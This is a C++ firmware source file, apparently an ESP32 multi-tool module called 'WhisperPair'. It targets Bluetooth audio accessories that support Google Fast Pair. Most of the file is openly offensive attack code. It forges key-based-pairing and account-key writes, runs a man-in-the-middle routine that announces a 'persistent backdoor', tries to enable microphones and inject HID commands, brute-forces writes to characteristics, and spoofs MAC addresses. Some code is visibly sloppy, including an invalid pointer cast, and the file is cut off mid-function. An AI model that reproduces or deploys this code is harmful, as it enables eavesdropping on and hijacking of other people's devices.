#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "fastpair_crypto.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include "modules/NRF24/nrf_jammer_api.h"
#include <algorithm>

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;
extern volatile int tftWidth;
extern volatile int tftHeight;

AudioCommandService audioCmd;
FastPairCrypto crypto;

class MyClientCallback : public NimBLEClientCallbacks {
    void onConnect(NimBLEClient* pClient) {
        Serial.println("Connected");
    }
    
    void onDisconnect(NimBLEClient* pClient) {
        Serial.println("Disconnected");
    }
};

MyClientCallback clientCB;

CapturedKeys g_capturedKeys;
bool g_capturing = false;
NimBLEAddress g_capturedPhoneAddr;
NimBLEAddress g_capturedTargetAddr;

class PairingCaptureCallback : public NimBLEScanCallbacks {
    void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
        if(!g_capturing) return;
        
        if(advertisedDevice->haveManufacturerData()) {
            std::string mfg = advertisedDevice->getManufacturerData();
            if(mfg.length() >= 2) {
                uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                
                if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
                    Serial.printf("\nFound FastPair device: %s\n", 
                                  advertisedDevice->getName().c_str());
                    
                    if(mfg.length() >= 4) {
                        uint8_t msg_type = mfg[2];
                        if(msg_type == 0x00) {
                            Serial.println("Phone detected!");
                            g_capturedPhoneAddr = advertisedDevice->getAddress();
                        } else if(msg_type == 0x10 || msg_type == 0x20) {
                            Serial.println("Target detected!");
                            g_capturedTargetAddr = advertisedDevice->getAddress();
                        }
                    }
                }
            }
        }
    }
};

PairingCaptureCallback pairingCaptureCB;

void diagnoseConnection(NimBLEAddress target) {
    Serial.println("\n=== CONNECTION DIAGNOSIS ===");
    Serial.printf("Target: %s\n", target.toString().c_str());
    
    NimBLEScan* scanner = NimBLEDevice::getScan();
    if(scanner) {
        Serial.println("Scanner available: YES");
    } else {
        Serial.println("Scanner available: NO");
    }
    
    NimBLEClient* testClient = NimBLEDevice::createClient();
    testClient->setClientCallbacks(&clientCB);
    testClient->setConnectTimeout(5);
    
    Serial.println("Attempting connection...");
    if(testClient->connect(target)) {
        Serial.println("Connection SUCCESS");
        
        const std::vector<NimBLERemoteService*> services = testClient->getServices(true);
        Serial.printf("Found %d services\n", services.size());
        
        testClient->disconnect();
    } else {
        Serial.println("Connection FAILED");
        
        scanner->clearResults();
        scanner->setActiveScan(true);
        scanner->start(1, false);
        
        bool found = false;
        for(int i = 0; i < scanner->getResults().getCount(); i++) {
            const NimBLEAdvertisedDevice* dev = scanner->getResults().getDevice(i);
            if(dev->getAddress().equals(target)) {
                Serial.printf("Device IS advertising (RSSI: %d)\n", dev->getRSSI());
                found = true;
                break;
            }
        }
        
        if(!found) {
            Serial.println("Device NOT found in scan");
        }
        
        scanner->stop();
    }
    
    NimBLEDevice::deleteClient(testClient);
    Serial.println("=== DIAGNOSIS COMPLETE ===\n");
}

bool connectWithRetry(NimBLEAddress target, int maxRetries, NimBLEClient** outClient) {
    for(int attempt = 0; attempt < maxRetries; attempt++) {
        Serial.printf("[CONNECT] Attempt %d/%d to %s\n", attempt+1, maxRetries, target.toString().c_str());
        
        NimBLEClient* pClient = NimBLEDevice::createClient();
        pClient->setClientCallbacks(&clientCB);
        pClient->setConnectTimeout(10);
        
        bool connected = pClient->connect(target);
        
        if(connected && pClient->isConnected()) {
            Serial.println("Connection successful");
            *outClient = pClient;
            delay(300);
            return true;
        }
        
        Serial.printf("Connection failed\n");
        NimBLEDevice::deleteClient(pClient);
        delay(1000);
    }
    
    return false;
}

void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor, uint16_t textColor) {
    tft.fillScreen(bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(textColor, bgColor);
    int yPos = 60;
    int lineHeight = 20;
    int maxLines = 8;
    for(int i = 0; i < std::min((int)lines.size(), maxLines); i++) {
        tft.setCursor(20, yPos);
        String displayLine = lines[i];
        if(displayLine.length() > 35) {
            displayLine = displayLine.substring(0, 32) + "...";
        }
        tft.print(displayLine);
        yPos += lineHeight;
    }
    tft.setCursor(20, 220);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2, const char* btn3, uint16_t color, bool showEscHint, bool autoProgress) {
    int buttonCount = 0;
    if(strlen(btn1) > 0) buttonCount++;
    if(strlen(btn2) > 0) buttonCount++;
    if(strlen(btn3) > 0) buttonCount++;
    if(buttonCount == 0 && autoProgress) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) {
                tft.print(lineStr.substring(30, 60) + "...");
            } else {
                tft.print(lineStr.substring(30));
            }
        } else {
            tft.print(line1);
        }
        delay(1500);
        return 0;
    }
    if(buttonCount == 0) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 100, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) {
                tft.print(lineStr.substring(30, 60) + "...");
            } else {
                tft.print(lineStr.substring(30));
            }
        } else {
            tft.print(line1);
        }
        tft.setCursor(20, 140);
        tft.print("Press any key to continue...");
        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else if(buttonCount == 1) {
        const char* buttons[] = {btn1, btn2, btn3};
        const char* actualBtn = "";
        for(int i = 0; i < 3; i++) {
            if(strlen(buttons[i]) > 0) {
                actualBtn = buttons[i];
                break;
            }
        }
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            if(lineStr.length() > 60) {
                tft.setCursor(20, 95);
                tft.print(lineStr.substring(30, 60) + "...");
            }
        } else {
            tft.print(line1);
        }
        String btnText = actualBtn;
        if(btnText.length() > 12) {
            btnText = btnText.substring(0, 9) + "...";
        }
        int btnWidth = btnText.length() * 12 + 20;
        if(btnWidth < 100) btnWidth = 100;
        int btnX = (tftWidth - btnWidth) / 2;
        int btnY = 150;
        tft.fillRoundRect(btnX, btnY, btnWidth, 35, 5, bruceConfig.priColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
        int textWidth = btnText.length() * 6;
        int textX = btnX + (btnWidth - textWidth) / 2;
        tft.setCursor(textX, btnY + 12);
        tft.print(btnText);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 200);
        tft.print("SEL: Select  ESC: Cancel");
        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("SELECT");
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        tft.print(line1);
        
        int btnWidth = 80;
        int btnHeight = 35;
        int btnY = 150;
        int8_t result = -2;
        
        if(strlen(btn1) > 0) {
            tft.fillRoundRect(50, btnY, btnWidth, btnHeight, 5, bruceConfig.priColor);
            tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
            tft.setCursor(60, btnY + 12);
            String btn1Str = btn1;
            if(btn1Str.length() > 8) btn1Str = btn1Str.substring(0, 5) + "...";
            tft.print(btn1Str);
        }
        
        if(strlen(btn2) > 0) {
            tft.fillRoundRect(150, btnY, btnWidth, btnHeight, 5, bruceConfig.secColor);
            tft.setTextColor(TFT_WHITE, bruceConfig.secColor);
            tft.setCursor(160, btnY + 12);
            String btn2Str = btn2;
            if(btn2Str.length() > 8) btn2Str = btn2Str.substring(0, 5) + "...";
            tft.print(btn2Str);
        }
        
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 200);
        if(strlen(btn3) > 0) {
            tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
        } else {
            tft.print("SEL: Btn1  NEXT: Btn2  ESC: Back");
        }
        
        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            if(check(NextPress)) {
                delay(200);
                return 1;
            }
            if(strlen(btn3) > 0 && check(PrevPress)) {
                delay(200);
                return 2;
            }
            delay(50);
        }
    }
}

void showWarningMessage(const char* message) {
    tft.fillScreen(TFT_YELLOW);
    drawMainBorderWithTitle("WARNING");
    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_YELLOW);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showErrorMessage(const char* message) {
    tft.fillScreen(TFT_RED);
    drawMainBorderWithTitle("ERROR");
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_RED);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showSuccessMessage(const char* message) {
    tft.fillScreen(TFT_GREEN);
    drawMainBorderWithTitle("SUCCESS");
    tft.setTextColor(TFT_BLACK, TFT_GREEN);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_GREEN);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

bool initBLEIfNeeded(const char* deviceName) {
    static bool initialized = false;
    if (!initialized) {
        NimBLEDevice::init(deviceName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        NimBLEDevice::setSecurityAuth(false, false, false);
        NimBLEDevice::setMTU(250);
        initialized = true;
    }
    return true;
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");
    tft.fillRect(20, 50, tftWidth - 40, 100, bruceConfig.bgColor);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 85);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    while(true) {
        if(check(EscPress)) {
            showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE, true, false);
            return false;
        }
        if(check(SelPress)) {
            showAdaptiveMessage("Confirmed!", "OK", "", "", TFT_WHITE, true, false);
            delay(300);
            return true;
        }
        delay(50);
    }
}

NimBLEAddress parseAddress(const String& addressInfo) {
    int colonPos = addressInfo.lastIndexOf(':');
    if(colonPos == -1) {
        return NimBLEAddress();
    }
    String mac = addressInfo.substring(0, colonPos);
    uint8_t type = addressInfo.substring(colonPos + 1).toInt();
    return NimBLEAddress(mac.c_str(), type);
}

bool whisperPairEfficientExploit(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    
    if(!connectWithRetry(target, 3, &pClient)) {
        showErrorMessage("Connection failed");
        return false;
    }
    
    if(!pClient || !pClient->isConnected()) {
        showErrorMessage("Client not connected");
        return false;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("No FastPair service");
        return false;
    }
    
    NimBLERemoteCharacteristic* pKbpChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKbpChar || !pKbpChar->canWrite()) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("No writable KBP");
        return false;
    }
    
    showAdaptiveMessage("Generating keys...", "", "", "", TFT_WHITE, false, true);
    uint8_t our_pubkey[65];
    size_t pub_len = 65;
    if(!crypto.generateValidKeyPair(our_pubkey, &pub_len)) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("Key gen failed");
        return false;
    }
    
    uint8_t seeker_hello[67] = {0};
    seeker_hello[0] = 0x00;
    seeker_hello[1] = 0x00;
    memcpy(&seeker_hello[2], our_pubkey, 65);
    
    if(!pKbpChar->writeValue(seeker_hello, 67, true)) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("Hello failed");
        return false;
    }
    
    delay(50);
    
    uint8_t pairing_complete[34] = {0};
    pairing_complete[0] = 0x02;
    uint8_t nonce[16];
    crypto.generateValidNonce(nonce);
    memcpy(&pairing_complete[1], nonce, 16);
    uint8_t fake_data[16];
    esp_fill_random(fake_data, 16);
    memcpy(&pairing_complete[17], fake_data, 16);
    pairing_complete[33] = 0x00;
    
    if(!pKbpChar->writeValue(pairing_complete, 34, true)) {
        showWarningMessage("Pairing failed");
    } else {
        showAdaptiveMessage("Pairing sent!", "", "", "", TFT_GREEN, false, true);
    }
    
    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(pAccountChar && pAccountChar->canWrite()) {
        uint8_t account_key[16];
        crypto.generatePlausibleAccountKey(nonce, account_key);
        uint8_t account_msg[18] = {0};
        account_msg[0] = 0x04;
        memcpy(&account_msg[1], account_key, 16);
        account_msg[17] = 0x00;
        
        if(pAccountChar->writeValue(account_msg, 18, true)) {
            delay(100);
            std::string response = pAccountChar->readValue();
            if(response.length() > 0) {
                showSuccessMessage("KEY ACCEPTED!");
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                return true;
            } else {
                showWarningMessage("Key sent, no response");
            }
        }
    }
    
    const std::vector<NimBLERemoteCharacteristic*> chars = pService->getCharacteristics(true);
    for(auto pChar : chars) {
        String uuid = pChar->getUUID().toString().c_str();
        if(uuid.indexOf("1234") != -1 || uuid.indexOf("1236") != -1) continue;
        if(pChar->canWriteNoResponse()) {
            uint8_t test_data[2] = {0x00, 0x00};
            if(pChar->writeValue(test_data, 2, false)) {
                showAdaptiveMessage("Can write to:", uuid.c_str(), "", "", TFT_YELLOW, false, true);
            }
        }
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    showAdaptiveMessage("Attempt complete", "", "", "", TFT_WHITE, false, true);
    return true;
}

bool attemptProtocolExploit(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    
    if(!connectWithRetry(target, 2, &pClient)) {
        return false;
    }
    
    if(!pClient || !pClient->isConnected()) {
        return false;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pChar) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    uint8_t packet[80];
    packet[0] = 0x00;
    packet[1] = 0x01;
    uint8_t timestamp[8];
    uint32_t time_val = millis();
    memcpy(timestamp, &time_val, 4);
    esp_fill_random(&timestamp[4], 4);
    memcpy(&packet[2], timestamp, 8);
    
    uint8_t pubkey[65];
    size_t pub_len = 65;
    crypto.generateValidKeyPair(pubkey, &pub_len);
    memcpy(&packet[10], pubkey, 65);
    packet[75] = 0x00;
    
    if(pChar->writeValue(packet, 76, true)) {
        delay(300);
        std::string response = pChar->readValue();
        if(response.length() > 0) {
            pClient->disconnect();
            NimBLEDevice::deleteClient(pClient);
            return true;
        }
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool bruteForceCharacteristics(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    
    if(!connectWithRetry(target, 2, &pClient)) {
        return false;
    }
    
    if(!pClient || !pClient->isConnected()) {
        return false;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    const std::vector<NimBLERemoteCharacteristic*> chars = pService->getCharacteristics(true);
    bool found = false;
    
    for(auto pChar : chars) {
        if(pChar->canWrite()) {
            uint8_t test_data[10];
            esp_fill_random(test_data, 10);
            if(pChar->writeValue(test_data, 10, false)) {
                found = true;
                delay(50);
            }
        }
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return found;
}

String selectTargetFromScan(const char* title) {
    String selectedMAC = "";
    uint8_t selectedAddrType = BLE_ADDR_PUBLIC;
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Scanning for devices...");
    
    NimBLEDevice::deinit(true);
    delay(100);
    NimBLEDevice::init("TargetScanner");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(false, false, false);
    NimBLEScan* pBLEScan = NimBLEDevice::getScan();
    pBLEScan->clearResults();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(67);
    pBLEScan->setWindow(33);
    pBLEScan->setDuplicateFilter(true);
    
    unsigned long scanStart = millis();
    pBLEScan->start(0, true);
    
    struct ScanDevice {
        String name;
        String address;
        uint8_t addrType;
        int rssi;
        bool fastPair;
    };
    std::vector<ScanDevice> devices;
    
    while (millis() - scanStart < 15000) {
        if (check(EscPress)) {
            pBLEScan->stop();
            NimBLEDevice::deinit(true);
            return "";
        }
        delay(10);
    }
    
    pBLEScan->stop();
    const NimBLEScanResults& foundDevices = pBLEScan->getResults();
    
    for(int i = 0; i < foundDevices.getCount(); i++) {
        const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
        if(!device) continue;
        
        ScanDevice dev;
        dev.name = device->getName().c_str();
        dev.address = device->getAddress().toString().c_str();
        dev.addrType = device->getAddressType();
        dev.rssi = device->getRSSI();
        dev.fastPair = false;
        
        if (dev.name.isEmpty() || dev.name == "(null)") {
            dev.name = dev.address;
        }
        
        if(device->haveManufacturerData()) {
            std::string mfg = device->getManufacturerData();
            if(mfg.length() >= 2) {
                uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
                    dev.fastPair = true;
                }
            }
        }
        
        devices.push_back(dev);
    }
    
    pBLEScan->clearResults();
    NimBLEDevice::deinit(true);
    
    if (devices.empty()) {
        showWarningMessage("NO DEVICES FOUND");
        delay(1500);
        return "";
    }
    
    std::sort(devices.begin(), devices.end(), [](const ScanDevice& a, const ScanDevice& b) {
        if(a.fastPair != b.fastPair) return a.fastPair;
        return a.rssi > b.rssi;
    });
    
    const int maxDevices = std::min((int)devices.size(), 6);
    int selectedIdx = 0;
    bool exitLoop = false;
    
    while(!exitLoop) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("SELECT DEVICE");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        int yPos = 60;
        
        for(int i = 0; i < maxDevices; i++) {
            const auto& dev = devices[i];
            String displayText = dev.name;
            if(displayText.length() > 18) {
                displayText = displayText.substring(0, 15) + "...";
            }
            displayText += " (" + String(dev.rssi) + "dB)";
            if(dev.fastPair) displayText += " [FP]";
            
            if(i == selectedIdx) {
                tft.fillRect(20, yPos, tftWidth - 40, 22, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
            } else {
                tft.fillRect(20, yPos, tftWidth - 40, 22, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            }
            
            tft.setCursor(25, yPos + 6);
            tft.print(displayText);
            yPos += 24;
        }
        
        tft.setCursor(20, yPos + 10);
        tft.print("UP/DOWN: Select  SEL: Connect  ESC: Back");
        
        unsigned long inputWaitStart = millis();
        bool gotInput = false;
        
        while(!gotInput && millis() - inputWaitStart < 30000) {
            if(check(PrevPress)) {
                if(selectedIdx > 0) selectedIdx--;
                gotInput = true;
                delay(200);
            }
            else if(check(NextPress)) {
                if(selectedIdx < maxDevices - 1) selectedIdx++;
                gotInput = true;
                delay(200);
            }
            else if(check(SelPress)) {
                tft.fillRect(20, yPos + 40, tftWidth - 40, 30, bruceConfig.bgColor);
                tft.setCursor(20, yPos + 40);
                tft.print("Connecting...");
                delay(500);
                selectedMAC = devices[selectedIdx].address;
                selectedAddrType = devices[selectedIdx].addrType;
                exitLoop = true;
                gotInput = true;
            }
            else if(check(EscPress)) {
                exitLoop = true;
                gotInput = true;
            }
            if(!gotInput) delay(10);
        }
        
        if(millis() - inputWaitStart >= 30000) {
            showWarningMessage("Selection timeout");
            break;
        }
    }
    
    if (!selectedMAC.isEmpty()) {
        return selectedMAC + ":" + String(selectedAddrType);
    }
    return "";
}

bool captureLivePairing(const char* scanName) {
    Serial.println("\n=== CAPTURING LIVE PAIRING ===");
    
    tft.fillScreen(TFT_BLUE);
    drawMainBorderWithTitle("CAPTURE MODE");
    tft.setTextColor(TFT_WHITE, TFT_BLUE);
    tft.setCursor(20, 60);
    tft.print("Waiting for pairing session...");
    
    NimBLEDevice::init(scanName);
    NimBLEScan* pScan = NimBLEDevice::getScan();
    pScan->setScanCallbacks(&pairingCaptureCB);
    pScan->setActiveScan(true);
    pScan->setInterval(50);
    pScan->setWindow(30);
    
    g_capturing = true;
    g_capturedPhoneAddr = NimBLEAddress();
    g_capturedTargetAddr = NimBLEAddress();
    
    unsigned long startTime = millis();
    bool gotPhone = false;
    bool gotTarget = false;
    
    while(millis() - startTime < 30000) {
        pScan->start(1, false);
        
        if(!g_capturedPhoneAddr.toString().empty()) {
            gotPhone = true;
            tft.setCursor(20, 170);
            tft.print("Phone detected!");
        }
        
        if(!g_capturedTargetAddr.toString().empty()) {
            gotTarget = true;
            tft.setCursor(20, 190);
            tft.print("Target detected!");
        }
        
        if(gotPhone && gotTarget) {
            Serial.println("\nBoth devices detected!");
            break;
        }
        
        if(check(EscPress)) {
            Serial.println("Capture cancelled");
            break;
        }
        
        delay(500);
    }
    
    pScan->stop();
    g_capturing = false;
    
    if(gotPhone && gotTarget) {
        showSuccessMessage("PAIRING SESSION CAPTURED!");
        return true;
    }
    
    showErrorMessage("Failed to capture pairing");
    return false;
}

bool performMITMAttack(NimBLEAddress target, CapturedKeys& keys) {
    Serial.println("\n=== STARTING MITM ATTACK ===");
    
    NimBLEClient* pTargetClient = nullptr;
    if(!connectWithRetry(target, 3, &pTargetClient)) {
        return false;
    }
    
    NimBLERemoteService* pService = pTargetClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pTargetClient->disconnect();
        NimBLEDevice::deleteClient(pTargetClient);
        return false;
    }
    
    NimBLERemoteCharacteristic* pKbpChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKbpChar) {
        pTargetClient->disconnect();
        NimBLEDevice::deleteClient(pTargetClient);
        return false;
    }
    
    uint8_t seeker_hello[67] = {0};
    seeker_hello[0] = 0x00;
    seeker_hello[1] = 0x00;
    
    if(keys.keys_captured) {
        memcpy(&seeker_hello[2], keys.phone_public_key, 65);
        Serial.println("Using captured phone public key");
    } else {
        crypto.generateValidKeyPair(keys.phone_public_key, (size_t*)65);
        memcpy(&seeker_hello[2], keys.phone_public_key, 65);
        Serial.println("Using generated phone public key");
    }
    
    if(!pKbpChar->writeValue(seeker_hello, 67, true)) {
        Serial.println("Failed to send seeker hello");
        pTargetClient->disconnect();
        NimBLEDevice::deleteClient(pTargetClient);
        return false;
    }
    
    delay(100);
    
    std::string response = pKbpChar->readValue();
    if(response.length() >= 65) {
        memcpy(keys.target_public_key, response.data() + 2, 65);
        Serial.println("Captured target's public key");
    }
    
    if(keys.keys_captured) {
        Serial.println("Using captured shared secret");
    } else {
        esp_fill_random(keys.shared_secret, 32);
        Serial.println("Using simulated shared secret");
    }
    
    uint8_t pairing_complete[34] = {0};
    pairing_complete[0] = 0x02;
    
    uint8_t nonce[16];
    crypto.generateValidNonce(nonce);
    memcpy(&pairing_complete[1], nonce, 16);
    
    uint8_t fake_payload[16];
    esp_fill_random(fake_payload, 16);
    memcpy(&pairing_complete[17], fake_payload, 16);
    pairing_complete[33] = 0x00;
    
    if(!pKbpChar->writeValue(pairing_complete, 34, true)) {
        Serial.println("Failed to send pairing complete");
    } else {
        Serial.println("Sent pairing complete");
    }
    
    delay(200);
    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(pAccountChar && pAccountChar->canWrite()) {
        uint8_t account_key[16];
        if(keys.keys_captured) {
            memcpy(account_key, keys.account_key, 16);
        } else {
            crypto.generatePlausibleAccountKey(nonce, account_key);
        }
        
        uint8_t account_msg[18] = {0};
        account_msg[0] = 0x04;
        memcpy(&account_msg[1], account_key, 16);
        account_msg[17] = 0x00;
        
        if(pAccountChar->writeValue(account_msg, 18, true)) {
            delay(100);
            std::string ack = pAccountChar->readValue();
            if(ack.length() > 0) {
                Serial.println("ACCOUNT KEY INJECTED!");
                memcpy(keys.account_key, account_key, 16);
                keys.keys_captured = true;
                showSuccessMessage("PERSISTENT BACKDOOR INSTALLED!");
            }
        }
    }
    
    pTargetClient->disconnect();
    NimBLEDevice::deleteClient(pTargetClient);
    
    if(keys.keys_captured) {
        Serial.println("\nMITM SUCCESSFUL!");
        return true;
    }
    
    return false;
}

bool activateMicrophoneHijack(NimBLEAddress target) {
    Serial.println("\n=== ATTEMPTING MICROPHONE HIJACK ===");
    
    NimBLEClient* pClient = nullptr;
    if(!connectWithRetry(target, 2, &pClient)) {
        return false;
    }
    
    NimBLERemoteService* pHfpService = pClient->getService(NimBLEUUID((uint16_t)0x111E));
    if(pHfpService) {
        Serial.println("HFP service found");
        
        NimBLERemoteCharacteristic* pAudioChar = pHfpService->getCharacteristic(NimBLEUUID((uint16_t)0x2BC8));
        if(pAudioChar && pAudioChar->canWrite()) {
            uint8_t enable_mic[] = {0x01, 0x00};
            if(pAudioChar->writeValue(enable_mic, 2, true)) {
                Serial.println("Microphone access attempted");
                showWarningMessage("MIC ACCESS ATTEMPTED");
            }
        }
    }
    
    NimBLERemoteService* pAvrcpService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
    if(pAvrcpService) {
        Serial.println("AVRCP service found");
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    
    return false;
}

bool simulateHIDKeyboard(NimBLEAddress target) {
    Serial.println("\n=== ATTEMPTING HID EMULATION ===");
    
    NimBLEClient* pClient = nullptr;
    if(!connectWithRetry(target, 2, &pClient)) {
        return false;
    }
    
    NimBLERemoteService* pHidService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
    if(pHidService) {
        Serial.println("HID service found!");
        
        const std::vector<NimBLERemoteCharacteristic*> chars = pHidService->getCharacteristics(true);
        for(auto pChar : chars) {
            String uuid = pChar->getUUID().toString().c_str();
            
            if(uuid.indexOf("2A4D") != -1 || 
               uuid.indexOf("2A4E") != -1 || 
               uuid.indexOf("2A4F") != -1) {
                
                if(pChar->canWrite()) {
                    uint8_t media_play[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                    
                    if(pChar->writeValue(media_play, 8, false)) {
                        Serial.println("HID command sent");
                        showWarningMessage("HID COMMAND INJECTED");
                    }
                }
            }
        }
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    
    return false;
}

void spoofBluetoothAddress(const uint8_t* new_mac) {
    Serial.printf("Spoofing MAC to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  new_mac[0], new_mac[1], new_mac[2],
                  new_mac[3], new_mac[4], new_mac[5]);
    
    NimBLEDevice::deinit(true);
    delay(100);
    
    char name[32];
